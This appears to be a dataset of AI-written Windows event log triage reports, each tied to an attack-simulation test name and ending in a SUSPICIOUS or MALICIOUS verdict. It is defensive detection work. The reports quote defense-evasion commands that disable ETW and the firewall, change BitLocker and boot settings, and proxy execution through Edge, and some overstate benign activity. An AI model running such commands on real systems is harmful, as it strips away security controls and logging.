   - The execution of `powershell.exe` with a command directed towards `diskshadow.exe` (which can be used for shadow copies) in conjunction with `wevtutil.exe`, which is often used to clear or save event logs, raises a potential red flag. This combination might signify an attempt at clearing logs to cover tracks after malicious activities.

2. **Diskshadow Command**:
   - The command-line interactions through PowerShell involve `diskshadow.exe`, file handling in a temporary directory, which is atypical for regular operations and can be associated with data exfiltration or manipulation attempts.

3. **Frequent Use of ConHost**:
   - `conhost.exe` is invoked several times in quick succession, each associated with other critical processes, including PowerShell and Wevtutil. While ConHost is a legitimate Windows component, its frequent activation can represent suspicious behavior if used to handle console windows for hidden activities.

4. **High Integrity Level Actions**:
   - Processes are executed with a high integrity level, suggesting that they are run with elevated privileges. This factor, combined with the aforementioned usage of scripting and administrative tools, may indicate privilege escalation attempts.

5. **Unusual Process Execution**:
   - The observed executions and their command lines do not resemble typical user-driven activities, particularly in a server context noted as ""SERVER002"". Examples include:
     - Command-line reference to temporary directories.
     - Simultaneous multiple edge update operations could indicate scripted tasks executing potentially unwanted or unauthorized updates or changes.
     - File paths and setups involving EdgeUpdate with GUIDs in paths could point to updates or configurations not typically visible during normal user activities.

Based on this analysis, while there are no explicit confirmations of a data breach or malicious payloads from the logs, there's significant anomalous behavior indicative of potential preparation for, or execution of, malicious activity. It is important to verify whether these activities were planned and authorized as part of IT operations or they represent unauthorized and potentially malicious acts.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct an immediate internal audit of any scheduled scripts or automation tasks that might validate these entries.
- Review user accounts for `SERVER002\admin_test` activities, ensuring all actions are accounted for and legitimate.
- Cross-reference these events with network logs or IDS/IPS events to uncover broader network-level interactions.
- Consider deploying enhanced monitoring and logging, focusing on PowerShell, Wevtutil, and Diskshadow activities.
- If not yet in place, deploy Group Policy restrictions to limit unnecessary or potentially risky executable usage, such as script-based utilities, on critical servers."
Rundll32 advpack.dll Execution,"### Analysis of Windows Event Logs

Upon reviewing the provided logs, certain behaviors may suggest potentially malicious activity. Here is a detailed breakdown of the findings:

1. **Unusual Process Execution and Command-Line Arguments**
   - **PowerShell Execution:** The use of `powershell.exe` (Event ID 17959) with an unspecified command line is a common tactic used in initial compromise scenarios. Without visibility into the exact command, it is difficult to determine its intention, but this warrants further investigation because PowerShell is frequently used for both administrative tasks and malicious purposes.
   - **Suspicious use of `rundll32.exe`:** There is an execution of `cmd.exe` with a command line that utilizes `rundll32.exe` to launch an `.inf` file (Event ID 17989 and Event ID 17991). This is suspicious as `rundll32.exe` is often used to execute DLLs that may be part of malicious payloads.

2. **Potential Indicator of Privilege Escalation**
   - **Security Log Event IDs 4624 and 4672:** These events show a logon type of 5 (Service start), and numerous high privileges granted (e.g., SeDebugPrivilege, SeTcbPrivilege). The granting of these privileges can be legitimate but could also signify privilege escalation occurring on the system.

3. **Execution of Multiple High Integrity Processes**
   - The logs indicate execution of several high-integrity processes by the user `SERVER002\admin_test`. High integrity is typical for administrative accounts, but combined with the command activities, it should raise some suspicion on this user's activities during the time frame.

4. **Microsoft Edge Update Processes**
   - There are multiple entries related to `MicrosoftEdgeUpdate.exe`, which seem to be part of a legitimate update process for the Microsoft Edge browser. Activity related to software updates is normal and expected, and these do not appear suspicious at the moment.

5. **Background Processes**
   - Regular activity of services such as `SecurityHealthService.exe`, `TrustedInstaller.exe`, and `Microsoft Windows Servicing Operation` (`TiWorker.exe`) indicates that the system is performing maintenance-related operations. These are expected on a functioning Windows system.

### Conclusion and Recommendation

Based on the logs, the execution of `cmd.exe` with `rundll32.exe` and the use of `powershell.exe` with no visible command content points to potential malicious behavior, or at least activities that should be further scrutinized to understand the purpose behind these command executions. The presence of potentially high-risk `SeDebugPrivilege` could also indicate a threat if misused.

#### Resolution:
- **SUSPICIOUS** - The logs warrant a deeper investigation, particularly focusing on the powershell.exe and rundll32.exe usage, with a specific look at their command-line arguments and associated files. There is a need to verify if these actions align with any authorized administrative tasks or configurations, and to assess the surrounding context of user `admin_test` activity during the specified timeframe.

#### Guidance on Next Steps:
1. **Collect additional logs:** Retrieve detailed PowerShell logs to capture any command strings executed.
2. **File and Antivirus Check:** Examine the file `data.011.inf` and its associated directory for any indicators of compromise. Ensure antivirus definitions are up to date and perform a full system scan.
3. **User Activity Review:** Confirm if the `admin_test` user had any legitimate reasons for performing these actions. Review logs for user account activity for abnormal patterns.
4. **Network Traffic Analysis:** Look at network logs to identify if any suspicious outbound connections were made around the time of the events.
5. **Review Security Policy:** Ensure that policies for privilege auditing are strong, focusing on preventing misuse of highly privileged activities."
Safe Mode Boot,"Based on the event logs provided, here are the findings and analysis:

1. **Process Executions and Anomalies**:
   - We see multiple executions of common Windows utilities, such as `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `bcdedit.exe`.
   - `wevtutil.exe` and `conhost.exe` executions are frequent and are initiated by `SERVER002\admin_test` user, which in itself is not inherently suspicious without additional malicious context.
   - `cmd.exe` is invoked with the command line argument `/c bcdedit /set safeboot network`. This is indicative of a change in the boot configuration to safe mode with networking, which could be a preparation for system intervention or troubleshooting but is very unusual if not intended. Such changes are often used by attackers as part of persistence mechanisms or to avoid certain security controls.

2. **Privilege Level and User Context**:
   - The integrity level of executions is noted as ""High,"" indicating these actions were taken with elevated privileges.
   - The user `SERVER002\admin_test` seems to have administrative privileges, executing various administrative tasks. This can be expected on a server, but highlights the risk if this user account is compromised.

3. **Unusual Script Execution**:
   - The use of `cmd.exe` to alter the boot configuration is particularly noteworthy. If this is not part of a scheduled or authorized maintenance action, it should be further investigated. This action, if unintended, is indicative of a compromise.
   
4. **Time Change Events**:
   - The logs involve time change events by `svchost.exe`. Time change logs lack direct malicious context here but should be monitored to ensure they align with expected system or maintenance events.

5. **Assessment**:
   - The command `bcdedit /set safeboot network` could indicate an attempt to reboot the system into safe mode with networking, possibly to disable some security features not active in this mode or to conduct further actions from a less restrictive environment.
   - The intent behind these actions is crucial. Without previous knowledge of intended maintenance activities, using command lines to set boot configurations is unusual and risky.

6. **Resolution**:
   - **SUSPICIOUS**: The logs contain activity that doesn't look right, especially the `bcdedit` command changing the boot configuration. This needs more investigation to understand intent and authorization. Unexplained and unscheduled command line alterations of critical system configurations should be regarded seriously.

**Guidance on Proceeding**:
- Confirm with system administrators if there was an authorized action involving these command lines during this period.
- Review other security logs for any concurrent anomalies or alerts.
- Consider measures to verify the integrity and recent activities of the `SERVER002\\admin_test` user account.
- Check system configurations and reboot logs to confirm if the changes took place and identify any unauthorized reboots."
InstallUtil Uninstall method call - -U variant,"## Log Analysis:

### Windows PowerShell Log:

1. **PowerShell Activity:**
   - The logs indicate a PowerShell session starting and running specific scripts located in the temp folder. 
   - PowerShell command execution: `Invoke-BuildAndInvokeInstallUtilAssembly` which is loading and executing a DLL (`data.004.dll`) and script (`InstallUtilTestHarness.ps1`).
   - The presence of assembly manipulation via PowerShell and the use of `InstallUtil` is concerning, as these techniques are often used in malicious activities to persist malware or execute payloads.

2. **Script and DLL Usage:**
   - The script attempts to test the execution of an uninstall method from the DLL file but throws an error due to an unexpected output.
   - The use of terms like Constructor, Install, and Uninstall constructions embedded in the DLL hint at complex operations, not typical for benign administrative scripts.

### Sysmon Logs:

1. **Process Creation:**
   - Frequent use of `conhost.exe`, `wevtutil.exe`, and PowerShell which were spawned by `wsmprovhost.exe`. This could be indicative of remote management activity (such as PowerShell Remoting) often used both for legitimate remote administration and lateral movement by attackers.
   - Execution of processes like `InstallUtil.exe` which aligns with PowerShell activities suggests an attempt to execute managed code in a special manner, possibly bypassing standard execution policy restrictions.
   - Execution of `.NET Framework` utilities, namely `csc.exe`, and `cvtres.exe`, further suggests that code compilation activities were undertaken, potentially for developing or managing .NET projects/files, often seen in script-based attacks.

2. **User Activity:**
   - Most activities were performed by the `SERVER002\admin_test` account, suggesting elevated privileges.
   - High integrity level for the processes indicates these were run with high-level permissions, which may suggest attempts to create or modify critical system configurations or files.

### Potential Indicators of Compromise (IoCs):

- Unusual PowerShell execution with assembly and install manipulation.
- Use of InstallUtil, a known Living-off-the-Land Binaries (LoLBins) commonly leveraged for persistence.
- Multiple temporary directories and files being used, aligned with the execution of Developer tools (csc.exe) indicative of code compilation directly on the server.

### Assessment:

**Resolution: SUSPICIOUS**

The logs show significant usage of PowerShell, compilation of code directly on the system, and usage of potentially malicious techniques that often tie back to malware behaviors, such as running custom scripts, DLL files, and the use of system tools for code execution purposes. While these activities can be part of a legitimate testing or development routine if the server is a development/test machine, they are also common tactics utilized by attackers. Without additional context, it is recommended to conduct a deeper investigation into this server, including examining file modifications, network connections during these operations, and verifying whether `SERVER002\admin_test` performed these actions as part of their legitimate administrative or test role. Consider securing credentials of `admin_test` and looking into potential exploitation vectors."
Ursnif Malware Registry Key Creation,"### Detailed Analysis of the Logs:

1. **Time Changes and System Integrity:**
    - Multiple events indicate a change in system time logged by the Kernel-General and Security auditing services. The time was adjusted in rapid succession within milliseconds by `svchost.exe`. Changing system time is a normal procedure if synchronized via a time source (such as an NTP server) but could also be suspicious if manipulated by a malicious user or process to cover tracks.
    - The `Microsoft-Windows-Time-Service` confirms synchronization with `time.windows.com`, which generally indicates benign activity – time synchronization.
    - Security Event ID 4616 indicates time change logged under `LOCAL SERVICE`, typical of legitimate time adjustments.

2. **Sysmon Logs - Process Creation:**
    - A series of `Sysmon` events report the execution of multiple system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`, executed by the user `SERVER002\admin_test`.
    - Notably, `cmd.exe` running with a command-line argument to add a registry key using `reg.exe` raises suspicion. It indicates potential persistence mechanisms (or configuration changes) being set.
    - The registry manipulation by `reg.exe` may imply the introduction of a startup persistence mechanism or potential alteration to the system configuration aimed at subverting normal operations.
    - The use of legitimate Windows binaries might suggest living-off-the-land tactics to avoid detection.

3. **Behavioral Analysis:**
    - Sequential execution of system utilities like `whoami.exe`, `hostname.exe`, followed by `cmd.exe` and `reg.exe` indicates enumeration and potential configuration change activities, which are often associated with malicious attempts in an unauthorized context.
    - The process `conhost.exe` is frequently spawned, likely as a necessary utility to facilitate console applications (normal behavior when running scripts or command-line utilities).

### Assessment and Findings:
- **Suspicious Behavior:**
  - The use of `cmd.exe` to run a suspicious registry command suggests a configuration change potentially detrimental to system integrity or security posture.
  - The presence of procedure chaining (`cmd` -> `conhost` -> `reg.exe`) under a high integrity level account denotes activities that should be scrutinized further for unauthorized tampering or privilege escalation attempts.

### Guidance and Resolution:
Given the analysis, the logs include a mix of normal activities such as time synchronization alongside suspicious behavior like unauthorized attempts to modify the registry via command line. These actions need to be probed deeper into by examining:
- User account `SERVER002\admin_test` usage history to verify legitimacy and authorization.
- Context and content of modified registry keys for harmful entries or persistence tactics.
- Cross-referencing potential alerts with other security tools for signs of remote code execution or lateral movement within the network.

**Resolution: SUSPICIOUS** - The logs do contain activities that do not look entirely normal and warrant further investigation to rule out malicious intent."
WinPwn - UAC Bypass ccmstp technique,"### Detailed Analysis of Log Entries

#### Windows PowerShell Logs

Upon reviewing the PowerShell log entries, the following suspicious activities were identified:

1. **Static URL Reference**: There is a consistent reference to a GitHub repository (https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn) from which a PowerShell script (`WinPwn.ps1`) is being downloaded and executed. Downloading script content from an external source and executing it directly without any validation or review is considered a significant security risk. This behavior is often associated with malicious activity.

2. **UAC Bypass Technique**: The script includes an attempt to bypass User Account Control (UAC) using a known technique (ccmstp) and execute `calc.exe`. While the execution of `calc.exe` on its own is harmless, the bypass method coupled with other indicators can be used for more malicious purposes, such as privilege escalation.

3. **PowerShell Command Execution**: The execution of PowerShell with a command aimed at downloading external scripts and attempting UAC bypass is a strong indicator of potential malicious behavior, particularly given the absence of typical administrative logging or error handling.

#### System Logs

The System logs don't reveal direct signs of compromise but provide context around the timestamps when other suspicious activities were noted.

#### Application Logs

No immediate suspicious entries were found within the Application logs. The logs show regular updates and security state checks, such as Windows Defender confirming its active status.

#### Sysmon Logs

The Sysmon logs provide detailed process creation events. Of note:

- **Process Execution Chain**: The execution chain includes `PowerShell.exe` triggered by `wsmprovhost.exe`, an indicator that the PowerShell script could have been initiated through a remote WMI related process. This aligns with tactics used by attackers to execute commands remotely and potentially evade detection.
- **High Integrity Level**: The executed PowerShell process runs at a high integrity level, which further implies the use of elevated privileges potentially obtained through UAC bypass or similar techniques.

#### Security Logs

The security logs primarily show time updates and are less descriptive regarding specific unauthorized access or escalation attempts. However, the activities within these logs align with the timestamps seen in other logs, adding temporal context to the identified behaviors.

### Assessment and Resolution

Based on the evidence collected from the logs:

- **Behavioral Pattern**: The pattern of downloading and executing scripts from an external source using PowerShell, coupled with a UAC bypass technique, indicates coercive actions potentially indicative of malicious intent.

- **Resolution**: **MALICIOUS**
  - The activities within the logs align with known tactics, techniques, and procedures (TTPs) associated with unauthorized system access, privilege escalation, and potential lateral movement within a network. The presence of a UAC bypass technique and untrusted script execution compounds these concerns.

### Guidance on How to Proceed

1. **Immediate Containment**:
   - Isolate the affected host (Server002) to prevent further potential lateral movement or external communication from the involved machine.

2. **Comprehensive Investigation**:
   - Perform a deeper forensic analysis to identify the root cause and full context of the scripts being executed. Check for any follow-up stages or dropped payloads.

3. **Alert Relevant Teams**:
   - Notify the IT security team for further incident response actions and ensure this host is closely monitored.

4. **Review Security Configurations**:
   - Ensure that PowerShell script execution policies are appropriately set to restrict execution of scripts from unknown or untrusted sources. 

5. **System Remediation**:
   - Clean the machine from any potential backdoors or unauthorized software that may have been installed.

6. **Awareness Training**:
   - Increase training efforts on identifying phishing and social engineering attempts potentially exploited to initially gain access.

By taking the above actions, the organization can aim to mitigate any impacts from the identified malicious behavior and reduce the likelihood of recurrence."
Disable .NET Event Tracing for Windows Via Registry (powershell),"Upon analyzing the provided Windows event logs from various channels including PowerShell, System, Sysmon, Security, and Application, I found several points of interest that raise concern regarding potentially malicious activity:

### PowerShell Log Analysis:
1. **Events:** Consistent use of PowerShell with the command:
   - `powershell.exe & {New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force}`
   
   This command sets a registry value related to .NET Framework and disables Event Tracing for Windows (ETW), which is a technique often used by attackers to avoid detection by security monitoring tools.

### System Log Analysis:
- **Time Change:** 
  - There are multiple events where system time was adjusted backward by a few seconds, which is unusual and could be an attempt to manipulate time-stamps to mask activities.

### Sysmon Log Analysis:
1. **Process Executions:**
   - Execution of `wevtutil.exe` by `SERVER002\admin_test`. `wevtutil` is a utility to clear or export event logs, and its use by admin_test may imply an attempt to clear signs of illicit activities.

   - `conhost.exe` instances launched as a child process of powershell.exe, indicating that the PowerShell sessions involved may have manipulated or used console sessions.

2. **PowerShell Execution:**
   - The execution of suspicious PowerShell commands aligns with previously noted PowerShell events.

### Security Log Analysis:
- **Time Change Events:**
  - Events showing time changes reflect similar concerns noted in the System log analysis regarding unusual time manipulations.

### Application Log Analysis:
- **Software Protection Platform:**
  - No immediate red flags found, but presence in logs suggests checks or changes in software licensing status which could be worth ensuring is routine or expected.

### Conclusion:
Upon reviewing these logs, the PowerShell command to disable ETW, coupled with registry modifications, is a known tactic for stealthy operations to prevent security event logging. Additionally, the repeated adjustment of system time backward can be interpreted as an attempt to confuse event timelines possibly to obscure tracing of activities. The use of standard tools like `wevtutil` for potentially clearing logs is indicative of evasion tactics.

### Final Assessment:
- **Resolution: MALICIOUS**

Although further investigation and correlation with additional data might be necessary to uncover the full extent, the combination of disabling ETW, registry modifications via PowerShell, suspicious time changes, and log clearing is indicative of malicious intent or operations.

### Guidance:
- **Immediate Actions:**
  - Consider isolating the machine for a thorough forensic investigation.
  - Review account `admin_test` activity comprehensively across the network.
  - Check for unusual scheduled tasks or persistent threats.
  - Corroborate with threat intelligence to identify if known IOCs match any of the observed behaviors.

- **Long-term Actions:**
  - Tighten PowerShell logging and constrain scripts to verified ones.
  - Implement enhanced monitoring for registry changes especially for ETW modifications.
  - Limit administrative access, and audit high-privilege user accounts.
  - Educate users about recognizing signs of phishing or social engineering attacks as potential entry vectors."
LOLBAS Msedge to Spawn Process,"Upon analyzing the provided logs, some key aspects stand out that require addressing:

1. **Process Execution and Command-line Arguments:**
   - Notably, there is a PowerShell execution with a command-line script that launches `msedge.exe` and, more suspiciously, `calc.exe` using a switch to disable the GPU sandbox: `& $edgePath --disable-gpu-sandbox --gpu-launcher=\""C:\\Windows\\System32\\calc.exe &&\""`.
   - The script further includes commands to terminate processes forcibly: `taskkill -f -im msedge.exe`, `taskkill -f -im calc.exe`, `taskkill -f -im win32calc.exe`.
   - The creation of a new Edge process with a command-line that includes ""gpu-launcher"" is highly unusual as it attempts to run the Windows Calculator (calc.exe) in a potentially harmful way.

2. **Indicators of Potential Malicious Activity:**
   - The use of PowerShell to execute a script that eventually launches the Calculator application (`calc.exe`) using unconventional command-line arguments is a common method utilized in exploits or exploitation frameworks to bypass security restrictions or execute undesired operations.
   - Additionally, the presence of `taskkill` commands intended to end Edge and Calculator processes programmatically suggests an intent to manage or obfuscate this activity.

3. **Leveraging Legitimate Binaries in Abnormal Ways:**
   - Leveraging legitimate applications like `MicrosoftEdgeUpdate.exe` in ways inconsistent with their expected usage can be indicative of an attempt to hide malicious activity among routine system operations.
   - The creation and repeated execution of Edge processes with bizarre arguments could be associated with an attacker gaining a foothold in the system and attempting to execute or establish persistence methods undetected.

Based on these observations, the findings from the log entries suggest potential compromise activities, especially centered around the PowerShell commands that manipulate Edge processes and execute Calculator in a likely exploitative manner.

**Resolution: MALICIOUS**
- The command-line behavior and process executions are significantly suspicious and align with tactics, techniques, and procedures (TTPs) commonly observed in malicious campaigns. Immediate containment, eradication, and analysis actions are recommended, including reviewing endpoint logs for further indicators of compromise and initiating incident response protocols.
- Further investigation should be conducted on the user `SERVER002\admin_test` and any potential lateral movement or unauthorized access on the network."
Modify UsePartialEncryptionKey Registry entry,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Analysis of Suspicious or Anomalous Behavior:
1. **Rapid Succession of Events:**
   - A series of processes involving `wevtutil.exe` and `conhost.exe` are executed rapidly (within milliseconds) by the `SERVER002\admin_test` user. While `conhost.exe` and `wevtutil.exe` are legitimate Windows processes, the context and association with certain users, especially administrative users or accounts with elevated privileges, can be unusual and warrant further analysis.
   
2. **Use of `cmd.exe` with Sensitive Command:**
   - There is an instance where `cmd.exe` was executed with a command to modify the Windows registry:
     - `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f`
     - Registry operations can be a legitimate administration task, but they can also be an indicator of potentially malicious activity, especially if related to encryption settings.

3. **Frequent Execution of `C:\Windows\System32\whoami.exe`:**
   - `whoami.exe` is used to enumerate user information, which can be legitimate but can also indicate reconnaissance activity if performed repeatedly without clear reason.

4. **Time Manipulation:**
   - There are events indicating time adjustments on the system. Time manipulation can sometimes be used to cover tracks or deceive logging mechanisms, although in this log, it appears straightforward and associated with `svchost.exe`.

5. **Microsoft Edge Update:**
   - Multiple events related to `MicrosoftEdgeUpdate.exe` show regular update behavior, which seems benign and part of routine software update processes by the SYSTEM user.

### Indication of Malicious Activity:
- **The Use of `wevtutil.exe`:**
  - `wevtutil.exe` is often associated with event log clearing or querying. Its use in rapid succession with `conhost.exe` may indicate attempts to modify or query logs, possibly indicative of malicious intent.
  
- **Registry Modification with Command Line:**
  - Altering registry keys via the command line, especially involving encryption settings, could suggest an attempt at weakening security or exfiltration preparation.

### Assessment:
Based on the review, there are multiple activities that appear suspicious:
- The rapid and frequent invocation of `wevtutil.exe` and `conhost.exe` under a user account with high privileges.
- Command execution that attempts to modify registry settings can be indicative of configuration changes aligned with malicious activities.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that are not immediately malicious but display suspicious behavior patterns and warrant further investigation. Actions such as verifying the purpose of registry changes, ensuring all processes are authorized, and possibly increasing monitoring on the executing users are recommended.

### Guidance on Proceeding:
1. **Conduct a Deeper Investigation:**
   - Run deeper analysis focusing on who the `admin_test` account is and what typical activities it should be performing. Ensure these processes are authorized and intended.
   
2. **Increase Monitoring:**
   - Implement more robust monitoring for future instances of `wevtutil.exe`, `whoami.exe`, and registry edits, particularly those arising from shared or administrative accounts.

3. **Validate Registry Modifications:**
   - Verify whether the registry changes to `HKLM\SOFTWARE\Policies\Microsoft\FVE` are legitimate, especially concerning the UsePartialEncryptionKey setting.

4. **Review and Audit Time Changes:**
   - Confirm whether the time alterations have legitimate explanations or whether they might have affected log timelines and system auditing capabilities.

5. **Evaluate Patch and Update Management Logs:**
   - Regular updates should be corroborated with patch management logs to identify any deviations from expected behavior. 

Further investigation and correlation with network activity or historical logs could illuminate whether patterns indicate emergent threats or benign administrative actions."
Requires the BitLocker PIN for Pre-boot authentication,"### Analysis of Logs:

1. **Process Execution Overview**:
   - A number of processes such as `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `cmd.exe` were executed by the user `SERVER002\admin_test` with a High Integrity Level. This indicates they have been run with elevated privileges.
   - `MicrosoftEdgeUpdate.exe` was executed by the system process, which is a typical process for updating Microsoft Edge.

2. **Suspicious Command Execution**:
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f` appears to modify the Windows registry. This can be suspicious as it involves changes to the registry settings related to BitLocker (Full Volume Encryption). Unauthorized registry modifications can be indicative of attempts to alter system configurations or establish persistence.

3. **Use of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` were executed. This tool is commonly used to manage and access event logs on Windows and its repeated execution could indicate attempts to clear or export logs.

4. **Time Changes**:
   - There are log entries indicating changes to the system time by the `svchost.exe` process. This can sometimes be a red flag as attackers may manipulate system time for various reasons, including log evasion. However, it can also occur during legitimate synchronization with a time server.

5. **Processes and Parent Processes**:
   - Many processes initiated by `SERVER002\admin_test` such as `whoami.exe`, `hostname.exe`, and `cmd.exe` spawned `conhost.exe`, which in itself isn't suspicious but should be noted in context with which applications are being supervised.

### Assessment:
- **Potential Unauthorized Registry Changes**: The registry modification using `reg.exe` is an indicator of suspicious activity since it relates to a security feature (BitLocker). This requires further investigation to determine if it was authorized or part of a configuration script.
- **Multiple `wevtutil.exe` Executions**: While it’s not immediately indicative of malicious activity, its repeated use coupled with changes in system clocks warrants additional scrutiny.

### Conclusion:
Based on the provided log entries, there are indicators of potentially suspicious behavior, particularly around the registry and event log modifications. While a concrete determination of malicious activity cannot be made without additional context (e.g., confirmation of script execution for legitimate purposes or system audits), the activities observed are sufficiently unusual to warrant further investigation. 

### Resolution: **SUSPICIOUS**

#### Guidance:
- **Investigate the Origin**: Confirm whether the registry changes were part of a sanctioned administrative task or automation/script.
- **Review User Activities**: Analyze the `SERVER002\admin_test` user's recent activities and permissions, ensuring changes align with role requirements.
- **Audit Event Logs**: Examine additional logs (beyond what's provided) to determine if `wevtutil.exe` was used to clear or export logs for unauthorized purposes.
- **Time Synchronization Check**: Verify the legitimacy of time changes; ensure they align with regular synchronization and are not manipulated for nefarious purposes.
- **Conduct a Thorough Scan**: Run antivirus and endpoint detection solutions to ensure there are no persistent threats."
Disable Microsoft Defender Firewall via Registry,"Upon reviewing the provided logs, here is a detailed analysis regarding possible indicators of malicious activity:

### Analysis:

1. **Windows Security Log:**
   - **Event ID 4616**: Indicates a change in the system time. The time was set back from ""2024-10-28 11:34:45.4756443"" to ""2024-10-28 11:34:38.8313005"", then adjusted multiple times. Unexplained time changes can be suspicious, particularly if an attacker is trying to alter security logs.
   - **Event ID 4634**: Logoff event for ""admin_test"".
   - **Event ID 4624 and 4672**: Multiple logons with elevated privileges for user ""admin_test"". These privileges include potentially dangerous rights like `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and others that can be misused for malicious purposes.

2. **Sysmon Log:**
   - There are numerous executions of `wevtutil.exe` which is a legitimate utility for managing event logs, and `conhost.exe` -which hosts console windows. This activity could be legitimate but may need scrutiny, especially if adjusting logs is suspected.
   - Execution of `whoami.exe` and `hostname.exe` to gather system information. While this alone isn't suspicious, it can be part of an initial reconnaissance by an attacker.
   - The command `cmd.exe` is used to disable the firewall (`...FirewallPolicy\PublicProfile` /v ""EnableFirewall"" /t REG_DWORD /d 0 /f`). Disabling the firewall is highly suspicious and indicative of potential malicious activity.

3. **Application Log:**
   - Regular Microsoft Edge Update processes observed. There is nothing inherently suspicious here assuming these are legitimate updates.

4. **System Log:**
   - Time changes and synchronization evident at the same moments as highlighted in the security logs.

### Assessment:

Based on the activities in the logs, the following points raise concerns:

- **Time Manipulation**: Modifying system time can be an attempt to cover tracks or avoid security controls that rely on time-based authentication.
- **Use of Elevated Privileges**: Logons with numerous high-privilege grants could indicate privilege escalation or use of compromised credentials.
- **Disabling Firewall**: Running a command to disable the firewall significantly raises the suspicion of unauthorized or malicious intent.

### Conclusion:

Given these findings, the totality of the evidence suggests that the activities captured in the logs exhibit behaviors consistent with a security breach or malicious activity. Unsanctioned use of high-level security privileges, coupled with the deliberate disabling of firewall protection, signifies a high-risk scenario.

### Resolution:

- **MALICIOUS**: The activity observed is strongly indicative of malicious activities. Immediate steps should be taken to:
  - Investigate the legitimacy of ""admin_test"" account actions.
  - Review and revert any unauthorized system and network changes.
  - Ensure audit logs and time-relevant security mechanisms are in place and resistant to tampering.
  - Conduct a thorough forensic analysis to determine the full scope of potential compromise."
Delete a single file - Windows cmd,"In reviewing the provided Windows Event Logs, I have concentrated on the Sysmon events, Security logs, Application, and System logs to identify any suspicious or potentially malicious activity.

### Sysmon Log Analysis:
1. **Command Execution:**
   - The logs indicate frequent invocation of `cmd.exe` processes with various command-line arguments. Examples include:
     - Checking or creating the existence of a file (`deleteme_data.004`) in the temp directory.
     - Deleting the same file.
   - Such repeated file operations, especially in the temp directory, might be indicative of malicious behavior like scripts carrying out cleanup tasks for hiding traces of intrusions.

2. **Process Execution:**
   - Multiple instances of `conhost.exe` were observed, which may correspond to legitimate console session management. However, the frequency and the patterns in which these instances are run (often as a child of potentially automated `cmd.exe` tasks) can be tell-tale signs of script execution or automation not previously noted as normal operation.

3. **Use of System Utilities:**
   - Several invocations of `wevtutil.exe` and `whoami.exe`. These utilities can be used maliciously to clear event logs (`wevtutil`) or gather system/user information (`whoami`).
   - Although common in administrative tasks, without context or user insight, these can be considered suspicious actions.

### Security Log Analysis:
- **Time Change Event (4616):** 
  - The security logs show an event with EventID 4616, indicating a system time change. Such action deserves further investigation, as attackers may alter system time to evade detection mechanisms or to confuse investigation timelines.

### System Log Analysis:
- **Time Change Records (EventID 1 and 24):**
  - Similar time changes observed, confirming that system time alterations were indeed made around the same timestamp as noted in the Security log. This aligns with the possibility of tampering.

### Application Log Analysis:
- **Software Protection Event (EventID 16384):**
  - It is observed, but no immediate signs of concern from a standalone analysis without contextual understanding of attempts to alter software protection settings.

### Conclusion:
Analyzing the provided events, several activities raise suspicion:
- **Frequent Automated Commands:** Usage patterns of command-line utilities like `cmd.exe` combined with `conhost.exe` in quick succession could indicate scripted operations or attempts to hide activities.
- **Utility Execution Patterns:** Invocations of `wevtutil.exe` and `whoami.exe` might signal operations that probe for system information or attempt to manipulate logs.
- **Altering System Time:** This suggests potential attempts to cover tracks.

### Assessment:
**Resolution: SUSPICIOUS**  
The activities observed are not conclusively malicious; however, they warrant further investigation. Steps should include:
- Verifying if these processes and utilities were part of any scheduled tasks or administrative functions.
- Analyzing user access patterns to confirm legitimacy.
- Reviewing and correlating with network logs to check for abnormal connections post or pre these events.
- Checking for any policy violations or unauthorized scripts on the host.

### Guidance on Proceeding:
- Conduct deeper investigation into logs and processes, particularly around the timestamps mentioned.
- Use security tools to analyze possible external connections.
- Validate current system time and review security policies surrounding system time adjustments."
Delete Prefetch File,"### Detailed Analysis:

**1. Windows PowerShell Log:**
   - The PowerShell logs show a command designed to delete the first prefetch file in the `C:\Windows\Prefetch` directory. Prefetch files are often targeted by attackers to remove traces of file execution history.
   - The command is executed with high privileges (`SERVER002\\admin_test`), which can indicate a potential attempt to cover tracks.
   - **Behavior:**
     - Using PowerShell to delete prefetch files without a legitimate reason is suspicious and may indicate efforts to hide malicious activity.

**2. Security Log:**
   - Event ID 4672 indicates privileged user accounts (likely `SYSTEM`) have special rights.
   - Failed credential requests are noticeable, especially errors against MicrosoftAccount and WindowsLive services. These repeated failures could hint at unauthorized access attempts.
   - Logon events (Event ID 4624) with elevated tokens, particularly with SYSTEM privileges, require scrutiny as they indicate activity with elevated permissions.
   - Multiple attempts to access and return credentials with Return Code ""3221226021"" suggest failure to access network resources, possibly indicating failed unauthorized attempts.

**3. Application Log:**
   - Windows Defender is on and operational, which is good from a defensive standpoint.
   - No direct indication of malicious activity from the application log alone, acting more as a reassuring presence of antivirus security.

**4. System Log:**
   - Time changes are recorded, potentially as a result of updating via an NTP server. Time updates through `svchost.exe` seem consistent with typical system updates.
   - Updates and patches are actively being applied, marked by Windows Update log entries, this is standard maintenance behavior.

**5. Sysmon Log:**
   - `whoami.exe` and `hostname.exe` executions are usually benign but noted here since they are executed by `admin_test`, potentially indicating recon or script automation.
   - The presence of `wevtutil.exe` used multiple times could signify attempts to manipulate or query event logs, potentially for log clearing or modification.
   - PowerShell execution with the command to delete prefetch files is repeated in detail, with logs showing lineage of this PowerShell process.
   - `taskhostw.exe` launched under `NT AUTHORITY\SYSTEM` further supports elevated privilege operations.

### Assessment:
- **Suspicious Behavior Identified:** 
  - Use of PowerShell to delete prefetch files stands out as deviating from standard procedure.
  - Failed credential attempts and logon events suggest potential unauthorized access attempts.
  - Elevated token usage is expected in system processes, but repeated failures in accessing credentials suggest potentially malicious intent.

### Final Conclusion: **SUSPICIOUS**
